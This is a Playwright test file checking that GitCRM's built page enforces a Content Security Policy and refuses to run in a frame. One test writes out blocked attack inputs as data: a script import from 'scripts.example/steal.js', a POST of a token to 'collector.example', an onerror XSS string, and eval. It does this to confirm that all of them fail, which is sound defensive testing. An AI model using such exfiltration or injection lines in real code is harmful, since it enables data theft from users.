// docs/07, "Content Security Policy and build audit": the built page enforces its policy, and the
// app refuses to run inside a frame.
import { CSP } from '../scripts/csp.ts';
import { expect, test } from './fixtures.ts';
import { open } from './workspace.ts';

test('the built page carries the policy in a meta tag, before any script or stylesheet', async ({ page }) => {
  await page.goto('./');
  const head = await page.evaluate(() =>
    [...document.head.children].map((element) => (element.matches('meta[http-equiv="Content-Security-Policy"]') ? 'policy' : element.tagName.toLowerCase())),
  );
  expect(head.indexOf('policy')).toBeGreaterThanOrEqual(0);
  expect(head.slice(0, head.indexOf('policy'))).not.toContain('script');
  expect(head.slice(0, head.indexOf('policy'))).not.toContain('link');
  expect(await page.locator('meta[http-equiv="Content-Security-Policy"]').getAttribute('content')).toBe(CSP);
});

test('the policy blocks a script from another site, an inline script, HTML from a string, eval, and a request to any site but api.github.com', async ({ page, cspViolations }) => {
  await open(page);
  // Chrome reports a request for the blocked script, then fails it before it leaves the browser.
  const finished: string[] = [];
  const failed: string[] = [];
  page.on('requestfinished', (request) => void (request.url().includes('.example') && finished.push(request.url())));
  page.on('requestfailed', (request) => void (request.url().includes('.example') && failed.push(request.failure()?.errorText ?? '')));

  const result = await page.evaluate(async () => {
    const outcome = (run: () => unknown) => {
      try {
        run();
        return 'ran';
      } catch (error) {
        return (error as Error).name;
      }
    };
    const steal = 'https://scripts.example/steal.js';
    // Trusted Types refuses a script address from a string; script-src blocks an import.
    const scriptUrl = outcome(() => (document.createElement('script').src = steal));
    const imported = await import(steal).then(
      () => 'loaded',
      () => 'blocked',
    );
    const inline = outcome(() => {
      const script = document.createElement('script');
      script.textContent = 'window.__inlineRan = true';
      document.head.append(script);
    });
    // Trusted Types: a string can no longer become HTML, the common way into an XSS.
    const html = outcome(() => (document.createElement('div').innerHTML = '<img src="x" onerror="window.__inlineRan = true">'));
    // oxlint-disable-next-line no-eval -- the test checks that the policy blocks eval
    const evaluated = outcome(() => (0, eval)('window.__evalRan = true'));
    const fetched = await fetch('https://collector.example/t', { method: 'POST', body: 'token' }).then(
      () => 'sent',
      (error: Error) => error.name,
    );
    const ran = (window as unknown as Record<string, unknown>).__inlineRan === true || (window as unknown as Record<string, unknown>).__evalRan === true;
    return { scriptUrl, imported, inline, html, evaluated, fetched, ran };
  });

  expect(result).toEqual({ scriptUrl: 'TypeError', imported: 'blocked', inline: 'TypeError', html: 'TypeError', evaluated: 'EvalError', fetched: 'TypeError', ran: false });
  expect(finished).toEqual([]);
  expect(failed).toEqual(['csp']); // Playwright's name for a request the policy blocked
  // The browser dispatches each violation event a moment after it blocks the action. Trusted
  // Types reports four: the script address, the inline script, the HTML, and eval.
  await expect
    .poll(() => cspViolations.filter((v) => v.startsWith('CSP violation:')).toSorted())
    .toEqual([
      'CSP violation: connect-src https://collector.example/t',
      ...Array<string>(4).fill('CSP violation: require-trusted-types-for trusted-types-sink'),
      'CSP violation: script-src-elem https://scripts.example/steal.js',
    ]);
  cspViolations.length = 0; // these violations were the point of the test
});

test('GitCRM refuses to run inside a frame, so another site cannot frame it', async ({ page, baseURL }) => {
  await page.setContent(`<iframe title="framed" src="${new URL('./', baseURL)}"></iframe>`);
  const frame = page.frameLocator('iframe[title="framed"]');
  await expect(frame.getByText('GitCRM does not run inside a frame. Open it in its own tab.')).toBeVisible();
  await expect(frame.getByRole('button', { name: 'Connect' })).toHaveCount(0);
});
